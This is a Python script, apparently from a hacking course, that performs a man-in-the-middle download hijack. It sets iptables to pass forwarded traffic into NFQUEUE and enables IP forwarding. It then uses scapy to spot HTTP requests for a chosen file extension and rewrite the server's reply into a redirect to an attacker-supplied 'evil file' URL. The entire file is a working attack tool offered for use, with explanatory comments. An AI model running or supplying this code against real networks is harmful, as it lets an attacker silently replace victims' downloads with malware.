#!/sur/bin/env python3

import subprocess
import netfilterqueue
import scapy.all as scapy

# Modify route: we'll modify the FORWARD chain and trap its content in NFQUEUE O
# iptables -I FORWARD -j NFQUEUE --queue-num 0
from scapy.layers.inet import IP, TCP

subprocess.run('iptables --flush', shell=True)
subprocess.run('iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)
# Enabling port forwarding
subprocess.run('echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)

evil_url = input("Specify a direct link to the evil file: ")
extension = input("Specify the extension of the file you want yo replace: ")

ack_list = []
#extensions_list = [".exe", ".pdf", ".png", ".txt", ".jpg", ".apk"]


def set_load(packet, load):
    # Now we'll set the url from which the fake file will be downloaded
    packet[scapy.Raw].load = load
    # Now we must remove the len in the IP layer and the chksum in IP and TCP layers
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # For dns Response DNSRR, for dns request DNSQR
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            # Now we'll put the extension of the file that we want to hijack,
            # it can be whatever, .pdf, .jpeg...
            #for extension in extensions_list:
            if extension in scapy_packet[scapy.Raw].load.decode():
                print("[+] Got an file download request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
            # if ".exe" in scapy_packet[scapy.Raw].load.decode():
            #     """
            #     The same thing would be achieved by:
            #     if ".exe" in str(scapy_packet[Raw].load):
            #     if b.".exe" in scapy_packet[Raw].load:
            #     """
            #     print("[+] exe Request")
            #     # We'll append the ack number to a list
            #     ack_list.append(scapy_packet[scapy.TCP].ack)
            #     # print(scapy_packet.show())
            # """
            # Packets are related with the ack and seq number, that's how we know
            # which is the response (seq) of which request (ack)
            # """
        elif scapy_packet[scapy.TCP].sport == 80:
            # We check if the seq number of the response is in the ack_list
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                # print(scapy_packet.show())
                modified_packet = set_load(scapy_packet, f"HTTP/1.1 301 Moved Permanently\nLocation: {evil_url}\n\n")

                packet.set_payload(bytes(modified_packet))

    packet.accept()


try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

except KeyboardInterrupt:
    subprocess.run('iptables --flush', shell=True)
    print("[+] Detected  CTRL + C ...... Deleting IP tables..... Please wait.\n")
